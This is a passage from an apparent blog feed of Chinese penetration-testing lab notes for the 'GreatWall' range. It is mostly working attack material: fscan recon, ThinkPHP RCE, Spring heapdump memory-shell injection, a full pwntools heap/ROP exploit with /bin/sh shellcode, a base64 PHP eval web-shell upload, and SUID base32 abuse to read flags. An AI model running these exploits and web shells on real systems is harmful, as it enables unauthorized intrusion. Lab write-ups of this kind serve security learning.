Zdgo0uOnKto+icg3m6BE5n+Kc8d9/7n4Y+jgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCVFuYElDQrgYncIua6XrLyoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDgyMDExNTk0MFqmERgPMjAyNDA4MjAyMTU5NDBapxEYDzIwMjQwODI3MTE1OTQwWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p>å¯¼å…¥åå³å¯å’ŒDCé€šè®¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \\DC.xiaorang.lab\c$\<span class="built_in">users</span>\administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>GreatWall</title>
    <link href="https://bowuchuling.github.io/posts/1877i0jy.html"/>
    <id>https://bowuchuling.github.io/posts/1877i0jy.html</id>
    <published>2024-06-03T16:10:27.997Z</published>
    <updated>2024-06-03T16:11:15.543Z</updated>
    
    <content type="html"><![CDATA[<h1>GreatWall</h1><p>8.130.13.188</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@chu0-System-Product-Name:/home/chu0<span class="comment"># ./fs -h 8.130.13.188</span></span><br><span class="line"></span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 8.130.13.188    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">8.130.13.188:8080 open</span></span><br><span class="line"><span class="string">8.130.13.188:22 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://8.130.13.188:8080  code:200 len:1027   title:Login Form</span></span><br><span class="line"><span class="string">[+] http://8.130.13.188:8080 poc-yaml-thinkphp5023-method-rce poc1</span></span><br></pre></td></tr></table></figure><h1>Login Form</h1><p>tpæ¼æ´ï¼Œgetshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">8.130</span><span class="number">.13</span><span class="number">.188</span>:<span class="number">8080</span>/bak.php</span><br><span class="line"></span><br><span class="line">å¯†ç <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag01: flag&#123;176f49b6-147f-<span class="number">4557</span>-99ec-ba0a351e1ada&#125;</span><br></pre></td></tr></table></figure><p>ä¼ çš„ä¸œè¥¿éƒ½åœ¨tmpç›®å½•ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>  netmask <span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span>  broadcast <span class="number">172.28</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">216</span>:3eff:fe03:2cf8  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">16</span>:3e:03:2c:f8  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">69276</span>  <span class="built_in">bytes</span> <span class="number">61509438</span> (<span class="number">61.5</span> MB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">36052</span>  <span class="built_in">bytes</span> <span class="number">12797326</span> (<span class="number">12.7</span> MB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">1408</span>  <span class="built_in">bytes</span> <span class="number">132612</span> (<span class="number">132.6</span> KB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">1408</span>  <span class="built_in">bytes</span> <span class="number">132612</span> (<span class="number">132.6</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p><code>./fs -h 172.28.23.1/24 -o result.txt</code>â€‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">21</span> <span class="built_in">open</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">10887</span>  title:<span class="literal">None</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span>  code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">1027</span>   title:Login Form</span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">13693</span>  title:æ–°ç¿”OAç®¡ç†ç³»ç»Ÿ-OAç®¡ç†å¹³å°è”ç³»ç”µè¯ï¼š<span class="number">13849422648</span>å¾®ä¿¡åŒå·ï¼ŒQQ958756413</span><br><span class="line">[+] ftp://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>:<span class="number">21</span>:anonymous </span><br><span class="line">   [-&gt;]OASystem.<span class="built_in">zip</span></span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>  code:<span class="number">302</span> <span class="built_in">len</span>:<span class="number">0</span>      title:<span class="literal">None</span> è·³è½¬url: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>/login;jsessionid=F702CE6B9A8E31175C941A003FBB23DA</span><br><span class="line">[*] WebTitle: http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span>/login;jsessionid=F702CE6B9A8E31175C941A003FBB23DA code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">3860</span>   title:æ™ºè”ç§‘æŠ€ ERP åå°ç™»é™†</span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.17</span>:<span class="number">8080</span> poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> poc-yaml-spring-actuator-heapdump-file </span><br><span class="line">[+] http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.33</span>:<span class="number">8080</span> poc-yaml-springboot-env-unauth spring2</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ä»£ç†8.130.13.188:10000</p><p>â€</p><h1>æ™ºè”ç§‘æŠ€ ERP åå°ç™»é™†</h1><p>springä¿¡æ¯æ³„éœ²ï¼Œheapdumpæ‹¿åˆ°keyï¼Œç„¶åæ³¨å…¥å†…å­˜é©¬</p><p><a href="http://172.28.23.33:8080/123">http://172.28.23.33:8080/123</a></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªpwnï¼Œåœ¨homeç›®å½•ä¸‹æœ‰ä¸ªop01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./HashNote&#x27;</span>)</span><br><span class="line">context(arch=elf.arch, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./HashNote&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;172.28.23.33&#x27;</span>, <span class="number">59696</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_command</span>(<span class="params">command</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_entry</span>(<span class="params">key, value</span>):</span><br><span class="line">    send_command(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_entry</span>(<span class="params">key</span>):</span><br><span class="line">    send_command(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_entry</span>(<span class="params">key, value</span>):</span><br><span class="line">    send_command(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Key: &#x27;</span>, key)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Data: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_username</span>(<span class="params">value</span>):</span><br><span class="line">    send_command(<span class="number">4</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;New username: &#x27;</span>, value)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Username: &#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Password: &#x27;</span>, <span class="string">&#x27;freep@ssw0rd:3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_entry(<span class="string">&#x27;aabP&#x27;</span>, <span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add_entry(<span class="string">&#x27;aace&#x27;</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">sc = [</span><br><span class="line">    <span class="string">&#x27;\x6a\x3b&#x27;</span>,                   <span class="comment"># push   0x3b</span></span><br><span class="line">    <span class="string">&#x27;\x58&#x27;</span>,                       <span class="comment"># pop    rax</span></span><br><span class="line">    <span class="string">&#x27;\x99&#x27;</span>,                       <span class="comment"># cdq</span></span><br><span class="line">    <span class="string">&#x27;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&#x27;</span>, <span class="comment"># movabs rbx, 0x68732f6e69622f2f</span></span><br><span class="line">    <span class="string">&#x27;\x53&#x27;</span>,                       <span class="comment"># push   rbx</span></span><br><span class="line">    <span class="string">&#x27;\x48\x89\xe7&#x27;</span>,               <span class="comment"># mov    rdi, rsp</span></span><br><span class="line">    <span class="string">&#x27;\x52&#x27;</span>,                       <span class="comment"># push   rdx</span></span><br><span class="line">    <span class="string">&#x27;\x57&#x27;</span>,                       <span class="comment"># push   rdi</span></span><br><span class="line">    <span class="string">&#x27;\x48\x89\xe6&#x27;</span>,               <span class="comment"># mov    rsi, rsp</span></span><br><span class="line">    <span class="string">&#x27;\x0f\x05&#x27;</span>                    <span class="comment"># syscall</span></span><br><span class="line">]</span><br><span class="line">shellcode = <span class="string">b&#x27;&#x27;</span>.join(sc)</span><br><span class="line">username_addr = <span class="number">0x5dc980</span></span><br><span class="line">fake_obj_addr = username_addr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_read</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + <span class="number">0x10</span>) + p64(<span class="number">4</span>)</span><br><span class="line">    fake_obj += <span class="string">&#x27;aahO&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(<span class="number">8</span>) + <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(<span class="number">128</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    get_entry(<span class="string">&#x27;aahO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»»æ„è¯»/å†™å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_write</span>(<span class="params">addr, data</span>):</span><br><span class="line">    payload = p64(fake_obj_addr)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">    fake_obj = p64(fake_obj_addr + <span class="number">0x10</span>) + p64(<span class="number">4</span>)</span><br><span class="line">    fake_obj += <span class="string">&#x27;aahO&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_obj += p64(addr) + p64(<span class="built_in">len</span>(data)) + <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload += fake_obj</span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.ljust(<span class="number">128</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    set_username(payload)</span><br><span class="line">    update_entry(<span class="string">&#x27;aahO&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x5e4c38</span></span><br><span class="line">arbitrary_read(environ)</span><br><span class="line">stack_addr = u64((p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>, drop=<span class="literal">False</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">success(<span class="string">&#x27;stack_addr&#x27;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000405e7c</span></span><br><span class="line">rsi = <span class="number">0x000000000040974f</span></span><br><span class="line">rax = <span class="number">0x00000000004206ba</span></span><br><span class="line">rdx_rbx = <span class="number">0x000000000053514b</span></span><br><span class="line">shr_eax_2 = <span class="number">0x0000000000523f2e</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004d9776</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi) + p64(username_addr &amp; ~<span class="number">0xfff</span>) + p64(rsi) + p64(<span class="number">0x1000</span>) + p64(rdx_rbx) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>) + p64(rax) + p64(<span class="number">0xa</span> &lt;&lt; <span class="number">2</span>) + p64(shr_eax_2) + p64(syscall_ret) + p64(username_addr + <span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">arbitrary_write(stack_addr - <span class="number">0x210</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;uname -ar&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag03: flag{6a326f94-6526-4586-8233-152d137281fd}</p><h1>æ–°ç¿”OA</h1><p><a href="http://172.28.23.26/uploadbase64.php">http://172.28.23.26/uploadbase64.php</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Description: PhpStorm.</span><br><span class="line"> * Author: yoby</span><br><span class="line"> * DateTime: <span class="number">2018</span>/<span class="number">12</span>/<span class="number">4</span> <span class="number">18</span>:01</span><br><span class="line"> * Email:logove@qq.com</span><br><span class="line"> * Copyright Yobyç‰ˆæƒæ‰€æœ‰</span><br><span class="line"> */</span><br><span class="line">$img = $_POST[<span class="string">&#x27;imgbase64&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, $img, $result)) &#123;</span><br><span class="line">    $<span class="built_in">type</span> = <span class="string">&quot;.&quot;</span>.$result[<span class="number">2</span>];</span><br><span class="line">    $path = <span class="string">&quot;upload/&quot;</span> . date(<span class="string">&quot;Y-m-d&quot;</span>) . <span class="string">&quot;-&quot;</span> . uniqid() . $<span class="built_in">type</span>;</span><br><span class="line">&#125;</span><br><span class="line">$img =  base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, $img));</span><br><span class="line"><span class="meta">@file_put_contents(<span class="params">$path, $img</span>);</span></span><br><span class="line">exit(<span class="string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imgbase64=data:image/php;base64,PD89ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>/upload/<span class="number">2024</span>-06-03-665db63834ca2.php</span><br><span class="line"></span><br><span class="line">å¯†ç <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603203627-ogh9siq.png" alt="image">â€‹</p><p>ä¿®æ”¹ç”Ÿæˆçš„æ–‡ä»¶ä¸­çš„æ–‡ä»¶åï¼Œæ”¹ä¸ºæˆ‘ä»¬çš„ä¸€å¥è¯é©¬å­ï¼Œè¿™é‡Œposté©¬å­æœ‰ç‚¹é—®é¢˜éœ€è¦æ¢æˆgetçš„é©¬å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>/upload/.antproxy.php?<span class="number">1</span>=system(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/<span class="built_in">bin</span>/fusermount</span><br><span class="line">/<span class="built_in">bin</span>/ping6</span><br><span class="line">/<span class="built_in">bin</span>/mount</span><br><span class="line">/<span class="built_in">bin</span>/su</span><br><span class="line">/<span class="built_in">bin</span>/ping</span><br><span class="line">/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/<span class="built_in">bin</span>/at</span><br><span class="line">/usr/<span class="built_in">bin</span>/staprun</span><br><span class="line">/usr/<span class="built_in">bin</span>/base32</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/sudo</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/s-nail/s-nail-privsep</span><br></pre></td></tr></table></figure><p>base32å…·æœ‰suidæƒé™ï¼Œç›´æ¥è¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag02: flag&#123;56d37734-5f73-447f-b1a5-a83f45549b28&#125;</span><br></pre></td></tr></table></figure><p>ifconfig</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:3e:04:<span class="number">99</span>:<span class="number">35</span>  </span><br><span class="line">          inet addr:<span class="number">172.28</span><span class="number">.23</span><span class="number">.26</span>  Bcast:<span class="number">172.28</span><span class="number">.255</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: fe80::<span class="number">216</span>:3eff:fe04:<span class="number">9935</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">52494</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">16279</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">57355451</span> (<span class="number">57.3</span> MB)  TX <span class="built_in">bytes</span>:<span class="number">14468994</span> (<span class="number">14.4</span> MB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:3e:04:<span class="number">67</span>:<span class="number">36</span>  </span><br><span class="line">          inet addr:<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>  Bcast:<span class="number">172.22</span><span class="number">.255</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: fe80::<span class="number">216</span>:3eff:fe04:<span class="number">6736</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">900</span> 